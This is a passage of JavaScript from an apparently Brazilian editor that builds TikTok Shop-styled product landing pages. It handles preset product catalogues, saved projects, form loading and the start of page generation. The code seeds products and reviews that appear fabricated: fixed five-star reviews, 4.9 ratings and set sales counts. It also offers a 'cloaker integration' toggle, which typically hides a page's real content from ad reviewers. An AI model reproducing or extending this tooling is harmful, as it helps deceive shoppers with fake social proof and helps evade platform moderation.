    statusDiv.innerText = "Buscando...";
    const extractedData = await fetchAndParseProductData(productUrl, statusDiv);
    const currentFooterData = getFooterData();
    addRecommendation({ ...extractedData, ...currentFooterData });
    statusDiv.innerText = "✅ Adicionado!";
    urlInput.value = "";
  } catch (error) { statusDiv.innerText = `❌ Erro: ${error.message}`; }
}

// ===================== LOJAS PRONTAS =====================
const LOJAS_PRONTAS = {
  "Loja Feminina": [
    { productTitle: "Body Suplex Feminina Plissado Mula Manca Regata Com Forro Um Ombro Tecido Grosso Tendencia Novidade Primavera", currentPrice: "29,63", originalPrice: "59,00", mainImage: "https://p16-oec-sg.ibyteimg.com/tos-alisg-i-aphluv4xwc-sg/06ab186951fc4bfd83677fa006dfd092~tplv-aphluv4xwc-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "1422", productUrl: "body-suplex-plissado-um-ombro", colors: [], sizes: ["PP","P","M","G","GG"], productDescription: "96%poliester, 4%elastano\npp Busto 68cm, comprimento 73 cm\nP Busto 72m , comprimento 74cm\nM Busto 76cm, comprimento 75 cm\nG Busto 80cm, comprimento 76cm\nGG Busto 84cm, comprimento 76cm", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Maria S.",stars:5,text:"Amei o produto!",details:"Tamanho M"}] },
    { productTitle: "Regata Plissado De alcinha Suplex Feminina Com Forro Tecido Grosso Tendencia Novidade Verao 34-44", currentPrice: "29,73", originalPrice: "59,00", mainImage: "https://p16-oec-sg.ibyteimg.com/tos-alisg-i-aphluv4xwc-sg/f0fc57f7c1d8431d96bac37f39a3d443~tplv-aphluv4xwc-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "1853", productUrl: "regata-plissado-alcinha-suplex", colors: [], sizes: ["34","36","38","40","42","44"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Ana P.",stars:5,text:"Perfeito!",details:"Tamanho 38"}] },
    { productTitle: "kit 3pcs Body Suplex Feminina Plissado Mula Manca Regata Com Forro Um Ombro Tecido Grosso Tendencia Novidade Primavera 34-44", currentPrice: "68,39", originalPrice: "120,00", mainImage: "https://p16-oec-sg.ibyteimg.com/tos-alisg-i-aphluv4xwc-sg/14739adfa2bb420cb515a8efe1cd0e28~tplv-aphluv4xwc-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "1340", productUrl: "kit-3pcs-body-suplex-plissado", colors: [], sizes: ["34","36","38","40","42","44"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Julia M.",stars:5,text:"Kit maravilhoso!",details:"Tamanho 36"}] },
    { productTitle: "Kit 3pcs Blusa Feminina Ribana de algodao Canelado Mula Manca Com decoracao de lenco Verao Tendencia", currentPrice: "33,72", originalPrice: "67,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/bb00cb8c2d674d75aa833e90556c8847~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "643", productUrl: "kit-3pcs-blusa-ribana-canelado", colors: [], sizes: ["P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Carla R.",stars:5,text:"Adorei!",details:"Tamanho M"}] },
    { productTitle: "Kit 3pcs Acme Blusa Feminina Manga Curto Cordao Ao Lado Ajustada Casual Verao dia dia Tendencia", currentPrice: "73,88", originalPrice: "140,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/f024274b45e74e788f3ce474703f670e~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "300", productUrl: "kit-3pcs-blusa-manga-curto-cordao", colors: [], sizes: ["P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Fernanda L.",stars:5,text:"Otimo!",details:"Tamanho G"}] },
    { productTitle: "Blusa Feminina Sem Manga Com Gola Plissada Regata Casual Verao Ajustada VIscose", currentPrice: "71,99", originalPrice: "130,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/c0020bd3908d44f4905e0eaace4f71df~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "277", productUrl: "blusa-sem-manga-gola-plissada", colors: [], sizes: ["P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Patricia S.",stars:5,text:"Linda!",details:"Tamanho P"}] },
    { productTitle: "Kit 3pcs Short Moletinho Com Lycra Simples Bolso Cintura Alta Moda Tendencia Confortavel", currentPrice: "67,49", originalPrice: "120,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/8eae942c80ba42b7a88c25d17ad3aeba~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "811", productUrl: "kit-3pcs-short-moletinho-lycra", colors: [], sizes: ["P","M","G","GG","EXG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Lucia A.",stars:5,text:"Super confortavel!",details:"Tamanho M"}] },
    { productTitle: "Body Suplex Feminina Gola Quadrada Manga Longa (nada Transparente) Tecido Grosso", currentPrice: "29,99", originalPrice: "59,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/0a00fd9e5d5f41c981cafb6b0b611d60~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "336", productUrl: "body-suplex-gola-quadrada-manga-longa", colors: [], sizes: ["PP","P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Beatriz C.",stars:5,text:"Tecido grosso mesmo!",details:"Tamanho P"}] },
    { productTitle: "kit 3pcs Body Suplex Feminina Mula Manca Regata Com Forro Dobro Interno Um Ombro Tecido Grosso", currentPrice: "34,19", originalPrice: "68,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/074be518a28b4e3f94978ba8bc5d229b~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "773", productUrl: "kit-3pcs-body-suplex-forro-duplo", colors: [], sizes: ["PP","P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Amanda F.",stars:5,text:"Excelente kit!",details:"Tamanho M"}] },
    { productTitle: "Regata Listrada Camiseta Basica Ribana Gola Redondo algodao comprido Moda blogueira", currentPrice: "36,00", originalPrice: "70,00", mainImage: "https://p16-oec-va.ibyteimg.com/tos-maliva-i-o3syd03w52-us/4000b07334af47f0b773c0977a514fac~tplv-o3syd03w52-resize-webp:800:800.webp?dr=15584&t=555f072d&ps=933b5bde&shp=6ce186a1&shcp=e1be8f53&idc=my&from=1826719393", productRating: "4.9", salesCount: "622", productUrl: "regata-listrada-camiseta-ribana", colors: [], sizes: ["P","M","G","GG"], productDescription: "", variation1Title: "Cor", variation2Title: "Tamanho", reviews: [{name:"Renata B.",stars:5,text:"Muito estilosa!",details:"Tamanho G"}] },
  ]
};

function importLojaPronta(lojaName) {
  const produtos = LOJAS_PRONTAS[lojaName];
  if (!produtos) return;
  const confirmBtn = document.getElementById('loja-pronta-confirm-' + lojaName.replace(/\s/g,'-'));
  if (confirmBtn) { confirmBtn.textContent = 'Importando...'; confirmBtn.disabled = true; }
  produtos.forEach((prod, i) => {
    setTimeout(() => {
      addRecommendation(prod);
      updateOutputDebounced();
    }, i * 100);
  });
  setTimeout(() => {
    if (confirmBtn) { confirmBtn.textContent = 'Importado!'; confirmBtn.style.background = '#22c55e'; }
    const dropdown = document.getElementById('lojas-prontas-dropdown');
    if (dropdown) dropdown.style.display = 'none';
  }, produtos.length * 100 + 300);
}
// ===================== FIM LOJAS PRONTAS =====================

function initItemEditors() {
  const recContainer = el("recommendation-items");
  if (recContainer && !el("main-add-rec-btn")) {
    // Adicionar secao LOJAS PRONTAS
    if (!document.getElementById('lojas-prontas-section')) {
      const lojasSection = document.createElement('div');
      lojasSection.id = 'lojas-prontas-section';
      lojasSection.style.cssText = 'margin-bottom:15px;';
      lojasSection.innerHTML = `
        <button id="lojas-prontas-toggle" onclick="
          const d=document.getElementById('lojas-prontas-dropdown');
          d.style.display=d.style.display==='none'?'block':'none';
          this.querySelector('.lp-arrow').style.transform=d.style.display==='block'?'rotate(180deg)':'rotate(0deg)';
        " style="width:100%;display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:linear-gradient(135deg,#10b981,#059669);color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:700;cursor:pointer;">
          <div style="display:flex;align-items:center;gap:10px;">
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
            LOJAS PRONTAS
          </div>
          <svg class="lp-arrow" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="transition:transform 0.2s;"><path d="M6 9l6 6 6-6"/></svg>
        </button>
        <div id="lojas-prontas-dropdown" style="display:none;margin-top:8px;background:#ecfdf5;border:1px solid #a7f3d0;border-radius:8px;overflow:hidden;">
          <div style="padding:12px 16px;border-bottom:1px solid #d1fae5;">
            <p style="margin:0;font-size:12px;color:#065f46;">Selecione uma loja para importar os 10 produtos prontos nas Recomendacoes:</p>
          </div>
          ${Object.keys(LOJAS_PRONTAS).map(lojaName => {
            const prods = LOJAS_PRONTAS[lojaName];
            const thumbs = prods.slice(0,3).map(p => '<img src="'+p.mainImage+'" style="width:32px;height:32px;object-fit:cover;border-radius:4px;border:1px solid #ddd;">').join('');
            const safeId = lojaName.replace(/\s/g,'-');
            return '<div style="padding:12px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;border-bottom:1px solid #d1fae5;"><div style="display:flex;align-items:center;gap:10px;"><div style="display:flex;gap:4px;">'+thumbs+'</div><div><div style="font-size:14px;font-weight:700;color:#064e3b;">'+lojaName+'</div><div style="font-size:12px;color:#059669;">'+prods.length+' produtos</div></div></div><button id="loja-pronta-confirm-'+safeId+'" onclick="importLojaPronta(\''+lojaName+'\')" style="background:#10b981;color:#fff;border:none;border-radius:6px;padding:8px 16px;font-size:13px;font-weight:700;cursor:pointer;white-space:nowrap;">Importar</button></div>';
          }).join('')}
        </div>
      `;
      recContainer.appendChild(lojasSection);
    }

    const addButton = document.createElement("button");
    addButton.className = "add-btn";
    addButton.id = "main-add-rec-btn";
    addButton.textContent = "Adicionar Recomendação Manual";
    addButton.onclick = () => addRecommendation();
    recContainer.appendChild(addButton);
  }
  const revContainer = el("review-items");
  if(revContainer && revContainer.innerHTML.trim() === "") {
        const defaultReviews = [
        { name: "n**a r**s", avatarUrl: "https://placehold.co/24x24/FFC0CB/000000?text=N", details: "Item: vermelho, unico", stars: 5, text: "O modelo é parecido porém o tecido não, comprei mais pelo tecido porém veio outro.", image: "https://placehold.co/100x100/faf3e0/333?text=Foto", },
        { name: "L**a R**o", avatarUrl: "https://placehold.co/24x24/ADD8E6/000000?text=L", details: "Item: vermelho, unico", stars: 1, text: "Não comprem, pq não é o mesmo modelo da foto!", image: "", },
        { name: "M**a S.", avatarUrl: "", details: "Item: Branco, P", stars: 5, text: "A estampa é linda demais, qualidade impecável. Recomendo muito a loja!", image: "https://placehold.co/100x100/fff/333?text=Review+3", },
      ];
      defaultReviews.forEach((review) => addReview(review));
  }
}

const LS_PROJECTS_KEY = "tktk_shop_projects";
function getProjects() { return JSON.parse(localStorage.getItem(LS_PROJECTS_KEY)) || {}; }
function saveProjects(projects) { localStorage.setItem(LS_PROJECTS_KEY, JSON.stringify(projects)); }
function updateProjectList() {
  const projects = getProjects();
  const projectList = el("project-list");
  if(!projectList) return;
  projectList.innerHTML = '<option value="">Carregar do Navegador</option>';
  for (const projectName in projects) {
    const option = document.createElement("option");
    option.value = projectName;
    option.textContent = projectName;
    projectList.appendChild(option);
  }
}

function getFooterData() {
  return {
    footerLinkPrivacy: val("footer-link-privacy"),
    footerLinkExchanges: val("footer-link-exchanges"),
    footerLinkShipping: val("footer-link-shipping"),
    footerLinkTerms: val("footer-link-terms"),
    footerEmail: val("footer-email"),
    footerWhatsapp: val("footer-whatsapp"),
    footerAddress: val("footer-address"),
    footerCnpj: val("footer-cnpj"),
    footerCompanyName: val("footer-company-name"),
    footerSecurityText: val("footer-security-text"),
    footerSecuritySealsImg: val("footer-security-seals-img"),
    footerCopyrightYear: val("footer-copyright-year"),
    footerCopyrightText: val("footer-copyright-text"),
  };
}

function getEditorData() {
    const chk = el("use-custom-checkout");
    const isChecked = chk ? chk.checked : true;
    const firePixelChk = el("pixel-trigger-type");
    const firePixelVal = firePixelChk ? firePixelChk.checked : true;
    const antiCopyChk = el("anti-copy-protection");
    const antiCopyVal = antiCopyChk ? antiCopyChk.checked : false;
    const licenseDomainVal = val("license-domain");
    const cloakerChk = el("use-cloaker-integration");
    const useCloakerVal = cloakerChk ? cloakerChk.checked : false;
    const upsellCheckbox = el("upsell-enable");
    const isUpsellActive = upsellCheckbox ? upsellCheckbox.checked : false;
    const upsellMode = val("upsell-mode");
    let finalUpsellUrl = isUpsellActive && upsellMode === 'custom' ? val("upsell-url") : "";

    // --- LÓGICA DO RODAPÉ (NOVA) ---
    const footerChk = el("enable-footer");
    const enableFooterVal = footerChk ? footerChk.checked : true;

    // Pega informações da Loja Principal para replicar
    const mainStoreName = val("store-name");
    const mainStoreLogo = val("store-logo-url");
    const mainStoreSales = val("store-sales");

    // Dados da pagina loja.html
    const couponTitle = val("coupon-title") || "Cupom de frete gratis";
    const couponSub = val("coupon-sub") || "Sem gasto minimo";
    const discountTitle = val("discount-title") || "Ate 85% OFF";
    const discountSub = val("discount-sub") || "Em produtos selecionados";
    let categoriesData = [];
    try {
        const catJson = val("store-categories");
        if (catJson && catJson.trim()) {
            categoriesData = JSON.parse(catJson);
        }
    } catch(e) { categoriesData = []; }

  return {
    siteLanguage: val("site-language") || "pt",
    enableFooter: enableFooterVal, // Salva o estado do rodapé
    tiktokPixelId: val("tiktok-pixel-id"),
    tiktokAccessToken: val("tiktok-access-token"),
    customWebhookUrl: val("custom-webhook-url"),
    firePixelOnGenerate: firePixelVal,
    useCloakerIntegration: useCloakerVal,
    upsellUrl: finalUpsellUrl,
    upsellModeSaved: isUpsellActive ? upsellMode : 'off', 
    upsellDelay: val("upsell-delay"),
    cardDeclineDiscount: val("card-decline-discount") || '15',
    securityDomain: licenseDomainVal,
    securityAntiCopy: antiCopyVal,
    useCustomCheckout: isChecked,
    productUrl: val("main-product-url-input"),
    productBadge: val("product-badge"),
    productTitle: val("product-title"),
    currentPrice: val("current-price"),
    originalPrice: val("original-price"),
    extraDiscounts: val("discount-text").split(",").map((s) => s.trim()).filter(Boolean),
    productRating: val("product-rating"),
    reviewCount: val("review-count"),
    salesCount: val("sales-count"),
    storeName: mainStoreName,
    storeLogoUrl: mainStoreLogo,
    storeSales: mainStoreSales,
    couponTitle: couponTitle,
    couponSub: couponSub,
    discountTitle: discountTitle,
    discountSub: discountSub,
    categories: categoriesData,
    mainImage: val("main-image"),
    additionalImages: val("additional-images").split(",").map((s) => s.trim()).filter(Boolean),
    descriptionImages: val("description-images").split(",").map((s) => s.trim()).filter(Boolean),
    descriptionBlocks: Array.isArray(importedDescriptionBlocksState) ? importedDescriptionBlocksState : [],
    rawDescriptionHtml: typeof importedRawDescriptionHtml !== 'undefined' ? importedRawDescriptionHtml : '',
    productDescription: val("product-description"),
    variation1Title: val("variation1-title"),
    variation2Title: val("variation2-title"),
    colors: Array.from(document.querySelectorAll("#color-options .option-item")).map((opt) => ({
        imageUrl: opt.querySelector(".color-image-url").value,
        name: opt.querySelector(".color-name").value,
        price: opt.querySelector(".color-price").value,
        originalPrice: opt.querySelector(".color-price").value || val("original-price"),
        checkoutUrl: opt.querySelector(".color-checkout-url").value,
      })).filter((c) => c.name), 
    sizes: Array.from(document.querySelectorAll('#size-options .option-item input[type="text"]')).map((i) => i.value).filter(Boolean),
    reviews: Array.from(document.querySelectorAll("#review-items .item-editor")).map((rev) => {
        const img1 = rev.querySelector(".rev-image-1");
        const img2 = rev.querySelector(".rev-image-2");
        const img3 = rev.querySelector(".rev-image-3");
        const img4 = rev.querySelector(".rev-image-4");
        const img5 = rev.querySelector(".rev-image-5");
        const imgOld = rev.querySelector(".rev-image"); // compatibilidade com formato antigo
        const images = [
          img1 ? img1.value : "",
          img2 ? img2.value : "",
          img3 ? img3.value : "",
          img4 ? img4.value : "",
          img5 ? img5.value : ""
        ].filter(Boolean);
        // Fallback para campo antigo
        if (images.length === 0 && imgOld && imgOld.value) images.push(imgOld.value);
        const name = rev.querySelector(".rev-name").value;
        const text = rev.querySelector(".rev-text").value;
        console.log('[v0] Review coletada:', { name, text: text.substring(0, 30), images: images.length });
        return {
          name: name,
          avatarUrl: rev.querySelector(".rev-avatar-url").value,
          details: rev.querySelector(".rev-details").value,
          stars: parseInt(rev.querySelector(".rev-stars").value),
          text: text,
          images: images
        };
      }).filter((r) => {
        const passou = r.name && r.text;
        if (!passou) console.log('[v0] Review FILTRADA (sem nome ou texto):', r.name, '|', r.text ? r.text.substring(0,20) : '(vazio)');
        return passou;
      }),
    recommendationDiscount: val("recommendation-discount"),
    reviewPresetCategory: val("review-preset-category"),
    recommendations: Array.from(document.querySelectorAll("#recommendation-items .item-editor")).map((rec) => {
      const fetchedData = JSON.parse(rec.dataset.productData || "{}");
      const colors = Array.from(rec.querySelectorAll(".rec-color-options .option-item")).map((opt) => ({
            imageUrl: opt.querySelector(".rec-color-image-url")?.value || '',
            name: opt.querySelector(".rec-color-name")?.value || '',
            price: opt.querySelector(".rec-color-price")?.value || '',
            checkoutUrl: opt.querySelector(".rec-color-checkout-url")?.value || '',
            originalPrice: opt.querySelector(".rec-color-price")?.value || ''
      })).filter((c) => c.name);
      const sizes = Array.from(rec.querySelectorAll(".rec-size-options .option-item .rec-size-name")).map((i) => i.value).filter(Boolean);
      const recReviews = Array.from(rec.querySelectorAll(".rec-reviews-container .rec-review-item")).map(rItem => {
          const recRevImgs = [
            rItem.querySelector(".rec-rev-img-1")?.value || rItem.querySelector(".rec-rev-img")?.value || '',
            rItem.querySelector(".rec-rev-img-2")?.value || '',
            rItem.querySelector(".rec-rev-img-3")?.value || '',
            rItem.querySelector(".rec-rev-img-4")?.value || '',
            rItem.querySelector(".rec-rev-img-5")?.value || ''
          ].filter(Boolean);
          return {
            name: rItem.querySelector(".rec-rev-name")?.value || '',
            avatarUrl: rItem.querySelector(".rec-rev-avatar")?.value || '',
            stars: parseInt(rItem.querySelector(".rec-rev-stars")?.value) || 5,
            text: rItem.querySelector(".rec-rev-text")?.value || '',
            image: recRevImgs[0] || '',
            images: recRevImgs,
            details: rItem.querySelector(".rec-rev-details")?.value || "Recomendado"
          };
      });
      return {
          productTitle: rec.querySelector(".rec-title")?.value || '',
          currentPrice: rec.querySelector(".rec-price")?.value || '',
          originalPrice: rec.querySelector(".rec-original-price")?.value || rec.querySelector(".rec-price")?.value || '',
          mainImage: rec.querySelector(".rec-image")?.value || '',
          productUrl: rec.querySelector(".rec-link")?.value || '',
          productDescription: rec.querySelector(".rec-description")?.value || '',
          variation1Title: rec.querySelector(".rec-variation1-title")?.value || 'Cor',
          variation2Title: rec.querySelector(".rec-variation2-title")?.value || 'Tamanho',
          colors: colors,
          sizes: sizes,
          reviews: recReviews,
          storeName: rec.querySelector(".rec-store-name")?.value || mainStoreName,
          storeLogoUrl: rec.querySelector(".rec-store-logo")?.value || mainStoreLogo,
          storeSales: rec.querySelector(".rec-store-sales")?.value || mainStoreSales,
          additionalImages: (rec.querySelector(".rec-additional-images")?.value || '').split(',').map(s => s.trim()).filter(s => s), 
          descriptionImages: (rec.querySelector(".rec-description-images")?.value || '').split(',').map(s => s.trim()).filter(s => s),
          descriptionBlocks: [],
          productRating: rec.querySelector(".rec-product-rating")?.value || "4.9",
          reviewCount: rec.querySelector(".rec-review-count")?.value || (recReviews.length > 0 ? recReviews.length : "15"),
          salesCount: rec.querySelector(".rec-sales-count")?.value || "100"
      };
    }),
    ...getFooterData(),
  };
}

function populateForm(data) {
  importedDescriptionBlocksState = Array.isArray(data.descriptionBlocks) ? data.descriptionBlocks : [];
  importedRawDescriptionHtml = data.rawDescriptionHtml || '';
  const chk = el("use-custom-checkout");
  if(chk) chk.checked = data.useCustomCheckout !== false;
  if (el("site-language")) el("site-language").value = data.siteLanguage || "pt";
  if (el("use-cloaker-integration")) el("use-cloaker-integration").checked = data.useCloakerIntegration !== false;
  
  // --- CARREGA O ESTADO DO RODAPÉ ---
  if (el("enable-footer")) el("enable-footer").checked = data.enableFooter !== false;
  if (el("review-preset-category")) el("review-preset-category").value = data.reviewPresetCategory || "";

  const ids = ["tiktok-pixel-id", "tiktok-access-token", "pixel-trigger-type", "custom-webhook-url", "upsell-url", "upsell-delay", "license-domain", "anti-copy-protection", "main-product-url-input", "product-badge", "product-title", "current-price", "original-price", "discount-text", "product-rating", "review-count", "sales-count", "store-name", "store-logo-url", "store-sales", "coupon-title", "coupon-sub", "discount-title", "discount-sub", "main-image", "additional-images", "description-images", "product-description", "variation1-title", "variation2-title", "recommendation-discount"];
  
  // Carrega categorias da loja
  if (el("store-categories") && data.categories) {
      el("store-categories").value = JSON.stringify(data.categories, null, 2);
  }
  
  ids.forEach(id => {
      const elHtml = el(id);
      if(!elHtml) return;
      let valData = data[id.replace(/-/g, '').replace('input','').replace('url','Url').replace('mainproduct','product')]; 
      
      if(id === 'discount-text') valData = (data.extraDiscounts || []).join(", ");
      if(id === 'additional-images') valData = (data.additionalImages || []).join(", ");
      if(id === 'description-images') valData = (data.descriptionImages || []).join(", ");
      if(id === 'pixel-trigger-type') { elHtml.checked = data.firePixelOnGenerate !== false; return; }
      if(id === 'anti-copy-protection') { elHtml.checked = data.securityAntiCopy === true; return; }
      
      const camelCaseKey = id.replace(/-([a-z])/g, (g) => g[1].toUpperCase());
      if(data[camelCaseKey] !== undefined) valData = data[camelCaseKey];
      
      if(valData !== undefined) elHtml.value = valData;
  });

  el("color-options").innerHTML = "";
  if (data.colors) data.colors.forEach((c) => addColor(normalizeColorObject(c, data.mainImage || "", data.currentPrice || "", data.originalPrice || data.currentPrice || "")));
  el("size-options").innerHTML = "";
  if (data.sizes) data.sizes.forEach((s) => addSize(typeof s === "string" ? s : ((s && s.name) ? s.name : "")));
  el("review-items").innerHTML = "";
  if (data.reviews) data.reviews.forEach((r) => addReview(r));

  const recContainer = el("recommendation-items");
  if(recContainer) {
      recContainer.innerHTML = ""; 
      const addButton = document.createElement("button");
      addButton.className = "add-btn";
      addButton.id = "main-add-rec-btn";
      addButton.textContent = "Adicionar Recomendação Manual";
      addButton.onclick = () => addRecommendation();
      recContainer.appendChild(addButton);
      if (data.recommendations) {
          data.recommendations.forEach((r) => addRecommendation(r));
      }
  }
  
  const fKeys = ["footerLinkPrivacy", "footerLinkExchanges", "footerLinkShipping", "footerLinkTerms", "footerEmail", "footerWhatsapp", "footerAddress", "footerCnpj", "footerCompanyName", "footerSecurityText", "footerSecuritySealsImg", "footerCopyrightYear", "footerCopyrightText"];
  fKeys.forEach(k => { if(data[k]) { const input = document.querySelector(`[id="${k.replace(/([A-Z])/g, '-$1').toLowerCase()}"]`); if(input) input.value = data[k]; } });
  
  // Carrega desconto de cartao recusado
  if (el("card-decline-discount")) el("card-decline-discount").value = data.cardDeclineDiscount || '15';

  const formEl = el("editor-form");
  if(formEl) setupLiveUpdateListeners(formEl);
  updateOutput();
}
function saveProject() {
  const projectName = prompt("Nome do projeto:");
  if (!projectName) return;
  const projects = getProjects();
  projects[projectName.trim()] = getEditorData();
  saveProjects(projects);
  alert("Salvo!");
  updateProjectList();
}
function loadProject() {
  const projectName = el("project-list").value;
  if (!projectName) return;
  populateForm(getProjects()[projectName]);
  updateOutput();
}
function deleteProject() {
  const projectName = el("project-list").value;
  if (confirm("Excluir?")) {
    const projects = getProjects();
    delete projects[projectName];
    saveProjects(projects);
    updateProjectList();
  }
}
function newProject() { if (confirm("Novo projeto?")) { populateForm({}); updateOutput(); } }
function exportProject() {
  const blob = new Blob([JSON.stringify(getEditorData(), null, 2)], { type: "application/json" });
  const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "proj.json"; a.click();
}
function importProject() { el("import-file-input").click(); }
function handleFileSelect(e) {
    const reader = new FileReader();
    reader.onload = (ev) => { populateForm(JSON.parse(ev.target.result)); updateOutput(); };
    reader.readAsText(e.target.files[0]);
}

// ============================================================================
// ===================== GERAÇÃO DO CÓDIGO HTML FINAL (INDEX.PHP) =============
// ============================================================================
function generateHTMLCode() {
  try {
    const data = getEditorData();
    const lang = data.siteLanguage || 'pt';
    const t = TRANSLATIONS[lang] || TRANSLATIONS['pt'];
    const cur = CURRENCY_CONFIG[lang] || CURRENCY_CONFIG['pt'];
    
    // Formatação de preço (Backend/Build time)
    const formatMoney = (valStr) => {
        if (!valStr) return "0.00";
        let clean = String(valStr).replace(/[^0-9.,]/g, '');
        if (clean.includes(',') && clean.includes('.')) clean = clean.replace(/\./g, '').replace(',', '.');
        else if (clean.includes(',')) clean = clean.replace(',', '.');
        let num = parseFloat(clean);
        if (isNaN(num)) num = 0;
        return num.toLocaleString(cur.locale, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    };

    const visualPatchCSS = `<style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        html, body { overflow-x: hidden; width: 100%; max-width: 100%; background-color: #f5f5f5; }
        body { padding-top: 90px; padding-bottom: 70px; max-width: 500px; margin: 0 auto; position: relative; }
        .mobile-header { position: fixed; top: 0; left: 0; width: 100%; background: #fff; z-index: 9000; max-width: 500px; left: 50%; transform: translateX(-50%); }
        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; height: 50px; }
        .actions-right { display: flex; align-items: center; gap: 15px; }
        .icon-btn { background: none; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; padding: 5px; }
        .icon-svg { width: 24px; height: 24px; display: block; }
        .cart-container { position: relative; display: flex; align-items: center; justify-content: center; }
        .cart-badge { position: absolute; top: -4px; right: -6px; background-color: #ff2b5e; color: white; font-size: 10px; font-weight: 700; height: 16px; min-width: 16px; border-radius: 8px; display: flex; align-items: center; justify-content: center; padding: 0 3px; border: 1px solid #fff; z-index: 2; }
        .tabs-bar { display: flex; align-items: center; padding: 0 15px; height: 40px; overflow-x: auto; white-space: nowrap; gap: 20px; background: #fff; border-bottom: 1px solid #eee; }
        .tabs-bar::-webkit-scrollbar { display: none; }
        .tab-item { font-size: 15px; color: #888; text-decoration: none; height: 100%; display: flex; align-items: center; position: relative; font-weight: 500; cursor: pointer; padding-bottom: 2px; }
        .tab-item.active { color: #000; font-weight: 700; }
        .tab-item.active::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 2px; background-color: #000; }
        
        /* FOOTER ATUALIZADO */
        .footer { position:fixed; bottom:0; left:0; right:0; max-width:500px; margin:0 auto; background:white; border-top:1px solid #f3f4f6; height:70px; display:flex; z-index:9000; align-items: center; padding: 0 10px;}
        .footer-icons { display: flex; width: auto; gap: 4px; margin-right: 8px; }
        .footer-icon-btn { width:50px; text-align:center; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px; background: none; border: none; cursor: pointer; padding: 0; }
        .footer-icon-btn img { width: 26px; height: 26px; display: block; object-fit: contain; }
        .footer-icon-btn span { font-size: 10px; font-weight: 700; color: #161823; line-height: 1; }
        .footer-actions { flex:1; display:flex; gap:10px; margin-left: 0; }
        .footer-btn { flex:1; padding:0 4px; border:none; border-radius: 24px; font-weight:700; font-size:15px; height: 46px; display: flex; flex-direction: column; align-items: center; justify-content: center; line-height: 1.1; text-align: center; cursor: pointer; }
        .add-to-cart-btn { background:#f1f1f2; color: #111; }
        .buy-now-btn { background:#fe2c55; color:white; }
        .buy-now-btn .buy-now-subtitle { font-size: 11px; font-weight: 500; opacity: 0.95; margin-top: 1px; }
        
        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:none; z-index:10000; align-items:flex-end; justify-content:center; }
        .modal-overlay.active { display:flex; }
        .modal-content { background:white; width:100%; max-width:500px; border-radius:16px 16px 0 0; padding:16px; animation: slideUp 0.3s; max-height: 85vh; overflow-y: auto; display: flex; flex-direction: column; position: relative; }
        @keyframes slideUp { from { transform:translateY(100%); } to { transform:translateY(0); } }
        .modal-header { display:flex; gap:12px; margin-bottom:20px; position:relative; padding-bottom: 15px; border-bottom: 1px solid #f0f0f0; }
